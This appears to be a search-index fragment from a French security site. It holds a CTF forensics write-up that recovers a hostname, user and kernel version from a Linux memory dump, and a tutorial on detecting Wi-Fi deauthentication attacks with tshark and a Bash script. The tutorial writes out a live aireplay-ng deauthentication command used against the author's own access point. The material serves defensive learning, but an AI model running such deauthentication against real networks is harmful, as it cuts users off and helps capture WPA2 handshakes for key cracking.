/usr/lib/jvm/java-11-openjdk-amd64/lib/plugin.jar /usr/lib/jvm/java-11-openjdk-amd64/lib /vmlinuz-5.4.0-4-amd64 root=UUID=536c82dd-f1c5-43ce-b65d-c94e5c4a5031 ro quiet vermagic=5.4.0-4-amd64 SMP mod_unload modversions 5.4.0-4-amd64 :amd64/mpih-add1.S:amd64/mpih-sub1.S:amd64/mpih-mul1.S:amd64/mpih-mul2.S:amd64/mpih-mul3.S:amd64/mpih-lshift.S:amd64/mpih-rshift.S 5.4.0-4-amd64 5.4.0-4-amd64 insmod lime-5.4.0-4-amd64.ko \"path=/dump.mem format=lime timeout=0\" Bon pas de doute le kernel est 5.4.0-4-amd64, on le voit gr\u00e2ce \u00e0 la commande lime qui permet de cr\u00e9er le dump, et gr\u00e2ce \u00e0 la variable d'environnement BOOT_IMAGE. Le flag : FCSC{challenge.fcsc:Lesage:5.4.0-4-amd64}","title":"1. La rentr\u00e9e"},{"location":"ctf/fcsc2020/rentree/#academie-de-linvestigation-cest-la-rentree","text":"","title":"Acad\u00e9mie de l'investigation - C'est la rentr\u00e9e"},{"location":"ctf/fcsc2020/rentree/#enonce","text":"Bienvenue \u00e0 l'acad\u00e9mie de l'investigation num\u00e9rique ! Votre mission, valider un maximum d'\u00e9tapes de cette s\u00e9rie afin de d\u00e9montrer votre dext\u00e9rit\u00e9 en analyse m\u00e9moire GNU/Linux. Premi\u00e8re \u00e9tape : retrouvez le HOSTNAME, le nom de l'utilisateur authentifi\u00e9 lors du dump et la version de Linux sur lequel le dump a \u00e9t\u00e9 fait. Format du flag : FCSC{hostname:user:x.x.x-x-amdxx} dmp.tar.gz","title":"\u00c9nonc\u00e9"},{"location":"ctf/fcsc2020/rentree/#etape-1-le-hostname","text":"Pour ce premier challenge forensic de l'FCSC, nous commencons les analyses avec strings et grep, les informations demand\u00e9s ne sont pas trop pouss\u00e9s et cela devrait suffir. J'essaye de jouer sur les variables d'environnement pour le hostname onosh@kali:/home/onosh/FCSC/FORENSIC/volatility# strings ../dmp/dmp.mem |grep -nH --color 'HOSTNAME' 70069:XAUTHLOCALHOSTNAME= 787892:RESOLVE-HOSTNAME%s %s 1060239:PWMGR_NUM_PASSWORDS_PER_HOSTNAME 1466026:XAUTHLOCALHOSTNAME 1492253:PWMGR_NUM_PASSWORDS_PER_HOSTNAME 1917088:NM_DHCP_HOSTNAME_FLAG_NONE 2067905:HOSTNAME 2352591:NO_HOSTNAME_SPECIFIED 2461029:XAUTHLOCALHOSTNAME 2539984:HOSTNAME 2539985:HOSTNAME 2844373:RESOLVE-HOSTNAME%s %s 2984831:HOSTNAME 3173881:_HOSTNAME=challenge.fcsc 3257537:HOSTNAME Bingo ! On a quelque chose de pas mal avec challenge.fcsc","title":"\u00c9tape 1 - Le Hostname"},{"location":"ctf/fcsc2020/rentree/#etape-2-le-nom-dutilisateur-authentifie","text":"Pour le nom d'utilisateur, j'ai essay\u00e9 de reproduire ce que l'on voit g\u00e9n\u00e9ralement dans le prompt d'un terminal c'est \u00e0 dire user@hostname, et je prend celui qui ai le plus apparu :) onosh@kali:/home/onosh/FCSC/FORENSIC/volatility# strings ../dmp/dmp.mem |grep --color '@challenge' |awk -F' ' '{print $1}' |sort |uniq -c |sort -n 1 +($debian_chroot)}root@challenge:~# 1 +($debian_chroot)}root@challenge:~/LiME/src# 1 ge@challenge: 1 )}root@challenge:~# 2 Lesage@challenge@ 4 esage@challenge: 4 Lesage@challenge:~$ 6 Lesage@challenge:~/Documents$ 8 [01;32mLesage@challenge 8 ]0;Lesage@challenge: 9 root@challenge:~/LiME/src# 17 root@challenge:~# 78 Lesage@challenge: Nous avons donc l'utilisateur Lesage","title":"\u00c9tape 2 - Le nom d'utilisateur authentifi\u00e9"},{"location":"ctf/fcsc2020/rentree/#etape-3-la-version-de-linux","text":"Ici on attend certainement une version de kernel linux, on peut le d\u00e9duire gr\u00e2ce au format du flag : x.x.x-x-amdxx onosh@kali:/home/onosh/FCSC/FORENSIC/volatility# strings ../dmp/dmp.mem |grep --color 'amd64' BOOT_IMAGE=/boot/vmlinuz-5.4.0-4-amd64 root=UUID=536c82dd-f1c5-43ce-b65d-c94e5c4a5031 ro quiet 5.4.0-4-amd64 (debian-kernel@lists.debian.org) (gcc version 9.2.1 20200203 (Debian 9.2.1-28)) #1 SMP Debian 5.4.19-1 (2020-02-13) Linux 5.4.0-4-amd64 Debian GNU/Linux bullseye/sid 5.4.0-4-amd64 /usr/lib/jvm/java-11-openjdk-amd64/lib /usr/lib/jvm/java-11-openjdk-amd64/lib/libnio.so /usr/lib/jvm/java-11-openjdk-amd64/lib/javaplugin.jar /usr/lib/jvm/java-11-openjdk-amd64/lib/libjimage.so /usr/lib/jvm/java-11-openjdk-amd64/lib/libzip.so /usr/lib/jvm/java-11-openjdk-amd64/lib/plugin.jar /usr/lib/jvm/java-11-openjdk-amd64/lib /vmlinuz-5.4.0-4-amd64 root=UUID=536c82dd-f1c5-43ce-b65d-c94e5c4a5031 ro quiet vermagic=5.4.0-4-amd64 SMP mod_unload modversions 5.4.0-4-amd64 :amd64/mpih-add1.S:amd64/mpih-sub1.S:amd64/mpih-mul1.S:amd64/mpih-mul2.S:amd64/mpih-mul3.S:amd64/mpih-lshift.S:amd64/mpih-rshift.S 5.4.0-4-amd64 5.4.0-4-amd64 insmod lime-5.4.0-4-amd64.ko \"path=/dump.mem format=lime timeout=0\" Bon pas de doute le kernel est 5.4.0-4-amd64, on le voit gr\u00e2ce \u00e0 la commande lime qui permet de cr\u00e9er le dump, et gr\u00e2ce \u00e0 la variable d'environnement BOOT_IMAGE. Le flag : FCSC{challenge.fcsc:Lesage:5.4.0-4-amd64}","title":"\u00c9tape 3 - La version de Linux"},{"location":"wiki/deauth/","text":"D\u00e9tecter la d\u00e9sauthentification L'attaque par d\u00e9sauthentification Une attaque de d\u00e9sauthentification Wi-Fi est un type d'attaque par d\u00e9ni de service qui cible la communication entre un utilisateur et un point d'acc\u00e8s sans fil Wi-Fi. La raison qui pousse les pirates \u00e0 effectuer ce genre d'attaque est qu'elle permet aussi d'\u00e9x\u00e9cuter une attaque par dictionnaire contre la cl\u00e9 WPA2 du point d'acc\u00e8s. L'envoi d'un paquet Deauth force le p\u00e9riph\u00e9rique cibl\u00e9 \u00e0 se d\u00e9connecter et \u00e0 se reconnecter, le pirate peut donc capturer le handshake entre votre appareil et le point d'acc\u00e8s et tenter de devinez votre cl\u00e9 secr\u00e8te. Comment d\u00e9tecter cette attaque ? Pr\u00e9requis Un syst\u00e8me linux \u00e9quipe de deux cartes wifi (2 physiques ou 1 physique + 1 virtuelle) L'outil tshark L'outil screen L'outil aircrack-ng Un point d'acc\u00e8s wifi \u00e0 analyser PoC Mise en place Sur votre linux, commencez par lister les interfaces wifi disponible : root@kali-onosh:~# iwconfig lo no wireless extensions. eth0 no wireless extensions. wlan0 IEEE 802.11 ESSID:\"notSoSecure\" Mode:Managed Frequency:5.52 GHz Access Point: 2E-D6-29-4E-2B-C9\" Bit Rate=866.7 Mb/s Tx-Power=22 dBm Retry short limit:7 RTS thr:off Fragment thr:off Encryption key:off Power Management:on Link Quality=59/70 Signal level=-51 dBm Rx invalid nwid:0 Rx invalid crypt:0 Rx invalid frag:0 Tx excessive retries:0 Invalid misc:94 Missed beacon:0 wlan1 IEEE 802.11 ESSID:off/any Mode:Managed Access Point: Not-Associated Tx-Power=20 dBm Retry short long limit:2 RTS thr:off Fragment thr:off Encryption key:off Power Management:off Ici, je vais utiliser l'interface wlan1 pour \u00e9couter les fr\u00e9quences 802.11. Activation du mode \"monitor\" : root@kali-onosh:~# airmon-ng start wlan1 PHY Interface Driver Chipset phy0 wlan0 iwlwifi Intel Corporation Wireless-AC 9560 [Jefferson Peak] (rev 10) phy1 wlan1 rt2800usb Ralink Technology, Corp. RT5370 (mac80211 monitor mode vif enabled for [phy1]wlan1 on [phy1]wlan1mon) (mac80211 station mode vif disabled for [phy1]wlan1) V\u00e9rification de l'activation du mode monitor : root@kali-onosh:~# iwconfig lo no wireless extensions. eth0 no wireless extensions. wlan0 IEEE 802.11 ESSID:\"notSoSecure\" Mode:Managed Frequency:5.52 GHz Access Point: 2E-D6-29-4E-2B-C9\" Bit Rate=866.7 Mb/s Tx-Power=22 dBm Retry short limit:7 RTS thr:off Fragment thr:off Encryption key:off Power Management:on Link Quality=57/70 Signal level=-53 dBm Rx invalid nwid:0 Rx invalid crypt:0 Rx invalid frag:0 Tx excessive retries:0 Invalid misc:129 Missed beacon:0 wlan1mon IEEE 802.11 Mode:Monitor Frequency:2.457 GHz Tx-Power=20 dBm Retry short long limit:2 RTS thr:off Fragment thr:off Power Management:off Ecoute du r\u00e9seau On r\u00e9cup\u00e8re le BSSID qui est l'adresse physique du point d'acc\u00e8s. Ici ma box internet est repr\u00e9sent\u00e9 par le SSID \"notSoSecure\" et le BSSID \"2E-D6-29-4E-2B-C9\". root@kali-onosh:~# airodump-ng wlan1mon CH 13 ][ Elapsed: 30 s ][ 2020-08-05 16:55 BSSID PWR Beacons #Data, #/s CH MB ENC CIPHER AUTH ESSID 2E-D6-29-4E-2B-C9 -17 20 0 0 6 180 WPA2 CCMP PSK notSoSecure BSSID STATION PWR Rate Lost Frames Notes Probes On va maintenant tenter d'intercepter des trames de d\u00e9sauthentification. Pour cela, j'utilise tshark en \u00e9coute sur mon interface wlan1mon en mode \"monitor\" et je cherche \u00e0 intercepter les trames \u00e0 destination de mon point d'acc\u00e8s via les filtres : wlan.fc.type_subtype==0x000c pour cibler les trames de d\u00e9sauthentification wlan.bssid==2E-D6-29-4E-2B-C9\" pour cibler les trames \u00e0 destination de ma box internet Je d\u00e9cide d'afficher : -e frame.time l'heure de l'interception de la requ\u00eate -e wlan.fc.type_subtype le type de la requ\u00eate Lancement de l'\u00e9coute tshark : tshark -i wlan1mon -Y \"wlan.fc.type_subtype==0x000c && wlan.bssid==2E-D6-29-4E-2B-C9\" -Tfields -e frame.time -e wlan.fc.type_subtype D\u00e9tection Pour obtenir un r\u00e9sultat sur notre \u00e9coute, il faut qu'il y est une attaque. Je lance donc une attaque de d\u00e9sauthentification sur ma box internet : root@kali-onosh:~# aireplay-ng -0 0 -a 2E-D6-29-4E-2B-C9 wlan1mon 19:43:43 Waiting for beacon frame (BSSID: 2E-D6-29-4E-2B-C9) on channel 1 19:43:43 Sending DeAuth (code 7) to broadcast -- BSSID: [2E-D6-29-4E-2B-C9] 19:43:43 Sending DeAuth (code 7) to broadcast -- BSSID: [2E-D6-29-4E-2B-C9] 19:43:43 Sending DeAuth (code 7) to broadcast -- BSSID: [2E-D6-29-4E-2B-C9] 19:43:44 Sending DeAuth (code 7) to broadcast -- BSSID: [2E-D6-29-4E-2B-C9] 19:43:44 Sending DeAuth (code 7) to broadcast -- BSSID: [2E-D6-29-4E-2B-C9] Dans la fenetre tshark, des trames apparaissent, une attaque de d\u00e9sauthentification est d\u00e9tect\u00e9e : root@kali-onosh:/tmp# tshark -i wlan1mon -Y \"wlan.fc.type_subtype==0x000c && wlan.bssid==2E-D6-29-4E-2B-C9\" -Tfields -e frame.time -e wlan.fc.type_subtype Aug 5, 2020 19:43:44.036371884 CEST 12 Aug 5, 2020 19:43:44.037317185 CEST 12 Aug 5, 2020 19:43:44.039473994 CEST 12 Aug 5, 2020 19:43:44.039561466 CEST 12 Aug 5, 2020 19:43:44.040821915 CEST 12 Aug 5, 2020 19:43:44.041637914 CEST 12 Aug 5, 2020 19:43:44.043805498 CEST 12 Aug 5, 2020 19:43:44.043887243 CEST 12 Aug 5, 2020 19:43:44.045101487 CEST 12 Aug 5, 2020 19:43:44.045982570 CEST 12 Aug 5, 2020 19:43:44.048169640 CEST 12 Aug 5, 2020 19:43:44.048245202 CEST 12 Aug 5, 2020 19:43:44.049446535 CEST 12 Automatisation Pour automatiser le processus, j'ai \u00e9cris le script ci-dessous. Il y a tr\u00e8s certainement moyen de l'am\u00e9liorer. Voici les t\u00e2ches qu'il effectue : Cr\u00e9ation d'un fichier pour l'interception des trames deauth.cap Ecoute du r\u00e9seau sur le BSSID cibl\u00e9 Lorsqu'une trame de d\u00e9sauthentification est d\u00e9tect\u00e9e, le programme analyse le nombre de trames d\u00e9tect\u00e9 car il peut y avoir des faux positifs. Apr\u00e8s quelques tests j'ai mis au point 3 crit\u00e8res : Plus de 5 trames = attaque en cours Entre 1 et 5 trames = faux positif (un de vos appareil se d\u00e9connecte normalement) 0 trames = pas d'attaque en cours #!/bin/bash if [ -f \"/tmp/deauth.cap\" ]; then rm /tmp/deauth.cap touch /tmp/deauth.cap else touch /tmp/deauth.cap fi screen -dm bash -c 'tshark -i wlan1mon -Y \"wlan.fc.type_subtype==0x000c && wlan.bssid==2E-D6-29-4E-2B-C9\" -Tfields -e frame.time -e wlan.fc.type_subtype >/tmp/deauth.cap' tail -fn0 /tmp/deauth.cap | \\ while read line ; do instant=$( echo $( date +\"%b\\ \\ %-d, %Y %H:%M:\") ) date=$( date ) nb=$( grep -i \"$instant\" /tmp/deauth.cap |wc -l ) if (( $nb > 5 )); then echo $date\" DEAUTH ATTAK DETECTED - $nb frames\" && echo $date\" DEAUTH ATTACK DETECTED - $nb frames\" >/tmp/deauth.log sleep 2 elif (( $nb > 0 && $nb <= 5 )); then echo $date\" DEAUTH FALSE POSITIVE DETECTED - $nb frames\" && echo $date\" DEAUTH FALSE POSITIVE DETECTED - $nb frames\" >/tmp/deauth.log sleep 2 else echo $date\" DEAUTH NO ATTACK DETECTED - $nb frames\" sleep 2 fi done Le script vous donne quelques logs : Wed 5 Aug 19:43:56 CEST 2020 DEAUTH ATTAKC DETECTED - 205 frames Wed 5 Aug 19:43:58 CEST 2020 DEAUTH ATTACK DETECTED - 205 frames Wed 5 Aug 19:44:00 CEST 2020 DEAUTH NO ATTACK DETECTED - 0 frames Wed 5 Aug 19:44:02 CEST 2020 DEAUTH NO ATTACK DETECTED - 0 frames Wed 5 Aug 19:44:04 CEST 2020 DEAUTH NO ATTACK DETECTED - 0 frames Wed 5 Aug 19:44:06 CEST 2020 DEAUTH NO ATTACK DETECTED - 0 frames Comment se prot\u00e9ger ? Aujourd'hui je ne connais pas de moyen pour proteger efficacement sa bonne vieille box internet des attaques par d\u00e9sauthentification. Pour ralentir le hacker, il est quand m\u00eame possible d'utiliser une cl\u00e9 WPA2 solide comme celle ci par exemple : vZbhJ]EN}F}v$(fhs~(3VC6m;s@Tk^v5 Le script ci-dessus permet quant \u00e0 lui de d\u00e9tecter ces attaques, peut-\u00eatre que vous reussirez \u00e0 cr\u00e9er quelques choses pour encore mieux vous d\u00e9fendre maintenant ? Sources https://www.sans.org/reading-room/whitepapers/wireless/80211-denial-service-attacks-mitigation-2108","title":"D\u00e9tecter la d\u00e9sauthentification"},{"location":"wiki/deauth/#detecter-la-desauthentification","text":"","title":"D\u00e9tecter la d\u00e9sauthentification"},{"location":"wiki/deauth/#lattaque-par-desauthentification","text":"Une attaque de d\u00e9sauthentification Wi-Fi est un type d'attaque par d\u00e9ni de service qui cible la communication entre un utilisateur et un point d'acc\u00e8s sans fil Wi-Fi. La raison qui pousse les pirates \u00e0 effectuer ce genre d'attaque est qu'elle permet aussi d'\u00e9x\u00e9cuter une attaque par dictionnaire contre la cl\u00e9 WPA2 du point d'acc\u00e8s. L'envoi d'un paquet Deauth force le p\u00e9riph\u00e9rique cibl\u00e9 \u00e0 se d\u00e9connecter et \u00e0 se reconnecter, le pirate peut donc capturer le handshake entre votre appareil et le point d'acc\u00e8s et tenter de devinez votre cl\u00e9 secr\u00e8te.","title":"L'attaque par d\u00e9sauthentification"},{"location":"wiki/deauth/#comment-detecter-cette-attaque","text":"","title":"Comment d\u00e9tecter cette attaque ?"},{"location":"wiki/deauth/#prerequis","text":"Un syst\u00e8me linux \u00e9quipe de deux cartes wifi (2 physiques ou 1 physique + 1 virtuelle) L'outil tshark L'outil screen L'outil aircrack-ng Un point d'acc\u00e8s wifi \u00e0 analyser","title":"Pr\u00e9requis"},{"location":"wiki/deauth/#poc","text":"","title":"PoC"},{"location":"wiki/deauth/#mise-en-place","text":"Sur votre linux, commencez par lister les interfaces wifi disponible : root@kali-onosh:~# iwconfig lo no wireless extensions. eth0 no wireless extensions. wlan0 IEEE 802.11 ESSID:\"notSoSecure\" Mode:Managed Frequency:5.52 GHz Access Point: 2E-D6-29-4E-2B-C9\" Bit Rate=866.7 Mb/s Tx-Power=22 dBm Retry short limit:7 RTS thr:off Fragment thr:off Encryption key:off Power Management:on Link Quality=59/70 Signal level=-51 dBm Rx invalid nwid:0 Rx invalid crypt:0 Rx invalid frag:0 Tx excessive retries:0 Invalid misc:94 Missed beacon:0 wlan1 IEEE 802.11 ESSID:off/any Mode:Managed Access Point: Not-Associated Tx-Power=20 dBm Retry short long limit:2 RTS thr:off Fragment thr:off Encryption key:off Power Management:off Ici, je vais utiliser l'interface wlan1 pour \u00e9couter les fr\u00e9quences 802.11. Activation du mode \"monitor\" : root@kali-onosh:~# airmon-ng start wlan1 PHY Interface Driver Chipset phy0 wlan0 iwlwifi Intel Corporation Wireless-AC 9560 [Jefferson Peak] (rev 10) phy1 wlan1 rt2800usb Ralink Technology, Corp. RT5370 (mac80211 monitor mode vif enabled for [phy1]wlan1 on [phy1]wlan1mon) (mac80211 station mode vif disabled for [phy1]wlan1) V\u00e9rification de l'activation du mode monitor : root@kali-onosh:~# iwconfig lo no wireless extensions. eth0 no wireless extensions. wlan0 IEEE 802.11 ESSID:\"notSoSecure\" Mode:Managed Frequency:5.52 GHz Access Point: 2E-D6-29-4E-2B-C9\" Bit Rate=866.7 Mb/s Tx-Power=22 dBm Retry short limit:7 RTS thr:off Fragment thr:off Encryption key:off Power Management:on Link Quality=57/70 Signal level=-53 dBm Rx invalid nwid:0 Rx invalid crypt:0 Rx invalid frag:0 Tx excessive retries:0 Invalid misc:129 Missed beacon:0 wlan1mon IEEE 802.11 Mode:Monitor Frequency:2.457 GHz Tx-Power=20 dBm Retry short long limit:2 RTS thr:off Fragment thr:off Power Management:off","title":"Mise en place"},{"location":"wiki/deauth/#ecoute-du-reseau","text":"On r\u00e9cup\u00e8re le BSSID qui est l'adresse physique du point d'acc\u00e8s. Ici ma box internet est repr\u00e9sent\u00e9 par le SSID \"notSoSecure\" et le BSSID \"2E-D6-29-4E-2B-C9\". root@kali-onosh:~# airodump-ng wlan1mon CH 13 ][ Elapsed: 30 s ][ 2020-08-05 16:55 BSSID PWR Beacons #Data, #/s CH MB ENC CIPHER AUTH ESSID 2E-D6-29-4E-2B-C9 -17 20 0 0 6 180 WPA2 CCMP PSK notSoSecure BSSID STATION PWR Rate Lost Frames Notes Probes On va maintenant tenter d'intercepter des trames de d\u00e9sauthentification. Pour cela, j'utilise tshark en \u00e9coute sur mon interface wlan1mon en mode \"monitor\" et je cherche \u00e0 intercepter les trames \u00e0 destination de mon point d'acc\u00e8s via les filtres : wlan.fc.type_subtype==0x000c pour cibler les trames de d\u00e9sauthentification wlan.bssid==2E-D6-29-4E-2B-C9\" pour cibler les trames \u00e0 destination de ma box internet Je d\u00e9cide d'afficher : -e frame.time l'heure de l'interception de la requ\u00eate -e wlan.fc.type_subtype le type de la requ\u00eate Lancement de l'\u00e9coute tshark : tshark -i wlan1mon -Y \"wlan.fc.type_subtype==0x000c && wlan.bssid==2E-D6-29-4E-2B-C9\" -Tfields -e frame.time -e wlan.fc.type_subtype","title":"Ecoute du r\u00e9seau"},{"location":"wiki/deauth/#detection","text":"Pour obtenir un r\u00e9sultat sur notre \u00e9coute, il faut qu'il y est une attaque. Je lance donc une attaque de d\u00e9sauthentification sur ma box internet : root@kali-onosh:~# aireplay-ng -0 0 -a 2E-D6-29-4E-2B-C9 wlan1mon 19:43:43 Waiting for beacon frame (BSSID: 2E-D6-29-4E-2B-C9) on channel 1 19:43:43 Sending DeAuth (code 7) to broadcast -- BSSID: [2E-D6-29-4E-2B-C9] 19:43:43 Sending DeAuth (code 7) to broadcast -- BSSID: [2E-D6-29-4E-2B-C9] 19:43:43 Sending DeAuth (code 7) to broadcast -- BSSID: [2E-D6-29-4E-2B-C9] 19:43:44 Sending DeAuth (code 7) to broadcast -- BSSID: [2E-D6-29-4E-2B-C9] 19:43:44 Sending DeAuth (code 7) to broadcast -- BSSID: [2E-D6-29-4E-2B-C9] Dans la fenetre tshark, des trames apparaissent, une attaque de d\u00e9sauthentification est d\u00e9tect\u00e9e : root@kali-onosh:/tmp# tshark -i wlan1mon -Y \"wlan.fc.type_subtype==0x000c && wlan.bssid==2E-D6-29-4E-2B-C9\" -Tfields -e frame.time -e wlan.fc.type_subtype Aug 5, 2020 19:43:44.036371884 CEST 12 Aug 5, 2020 19:43:44.037317185 CEST 12 Aug 5, 2020 19:43:44.039473994 CEST 12 Aug 5, 2020 19:43:44.039561466 CEST 12 Aug 5, 2020 19:43:44.040821915 CEST 12 Aug 5, 2020 19:43:44.041637914 CEST 12 Aug 5, 2020 19:43:44.043805498 CEST 12 Aug 5, 2020 19:43:44.043887243 CEST 12 Aug 5, 2020 19:43:44.045101487 CEST 12 Aug 5, 2020 19:43:44.045982570 CEST 12 Aug 5, 2020 19:43:44.048169640 CEST 12 Aug 5, 2020 19:43:44.048245202 CEST 12 Aug 5, 2020 19:43:44.049446535 CEST 12","title":"D\u00e9tection"},{"location":"wiki/deauth/#automatisation","text":"Pour automatiser le processus, j'ai \u00e9cris le script ci-dessous. Il y a tr\u00e8s certainement moyen de l'am\u00e9liorer. Voici les t\u00e2ches qu'il effectue : Cr\u00e9ation d'un fichier pour l'interception des trames deauth.cap Ecoute du r\u00e9seau sur le BSSID cibl\u00e9 Lorsqu'une trame de d\u00e9sauthentification est d\u00e9tect\u00e9e, le programme analyse le nombre de trames d\u00e9tect\u00e9 car il peut y avoir des faux positifs. Apr\u00e8s quelques tests j'ai mis au point 3 crit\u00e8res : Plus de 5 trames = attaque en cours Entre 1 et 5 trames = faux positif (un de vos appareil se d\u00e9connecte normalement) 0 trames = pas d'attaque en cours #!/bin/bash if [ -f \"/tmp/deauth.cap\" ]; then rm /tmp/deauth.cap touch /tmp/deauth.cap else touch /tmp/deauth.cap fi screen -dm bash -c 'tshark -i wlan1mon -Y \"wlan.fc.type_subtype==0x000c && wlan.bssid==2E-D6-29-4E-2B-C9\" -Tfields -e frame.time -e wlan.fc.type_subtype >/tmp/deauth.cap' tail -fn0 /tmp/deauth.cap | \\ while read line ; do instant=$( echo $( date +\"%b\\ \\ %-d, %Y %H:%M:\") ) date=$( date ) nb=$( grep -i \"$instant\" /tmp/deauth.cap |wc -l ) if (( $nb > 5 )); then echo $date\" DEAUTH ATTAK DETECTED - $nb frames\" && echo $date\" DEAUTH ATTACK DETECTED - $nb frames\" >/tmp/deauth.log sleep 2 elif (( $nb > 0 && $nb <= 5 )); then echo $date\" DEAUTH FALSE POSITIVE DETECTED - $nb frames\" && echo $date\" DEAUTH FALSE POSITIVE DETECTED - $nb frames\" >/tmp/deauth.log sleep 2 else echo $date\" DEAUTH NO ATTACK DETECTED - $nb frames\" sleep 2 fi done Le script vous donne quelques logs : Wed 5 Aug 19:43:56 CEST 2020 DEAUTH ATTAKC DETECTED - 205 frames Wed 5 Aug 19:43:58 CEST 2020 DEAUTH ATTACK DETECTED - 205 frames Wed 5 Aug 19:44:00 CEST 2020 DEAUTH NO ATTACK DETECTED - 0 frames Wed 5 Aug 19:44:02 CEST 2020 DEAUTH NO ATTACK DETECTED - 0 frames Wed 5 Aug 19:44:04 CEST 2020 DEAUTH NO ATTACK DETECTED - 0 frames Wed 5 Aug 19:44:06 CEST 2020 DEAUTH NO ATTACK DETECTED - 0 frames","title":"Automatisation"},{"location":"wiki/deauth/#comment-se-proteger","text":"Aujourd'hui je ne connais pas de moyen pour proteger efficacement sa bonne vieille box internet des attaques par d\u00e9sauthentification. Pour ralentir le hacker, il est quand m\u00eame possible d'utiliser une cl\u00e9 WPA2 solide comme celle ci par exemple : vZbhJ]EN}F}v$(fhs~(3VC6m;s@Tk^v5 Le script ci-dessus permet quant \u00e0 lui de d\u00e9tecter ces attaques, peut-\u00eatre que vous reussirez \u00e0 cr\u00e9er quelques choses pour encore mieux vous d\u00e9fendre maintenant ?","title":"Comment se prot\u00e9ger ?"},{"location":"wiki/deauth/#sources","text":"https://www.sans.org/reading-room/whitepapers/wireless/80211-denial-service-attacks-mitigation-2108","title":"Sources"}]}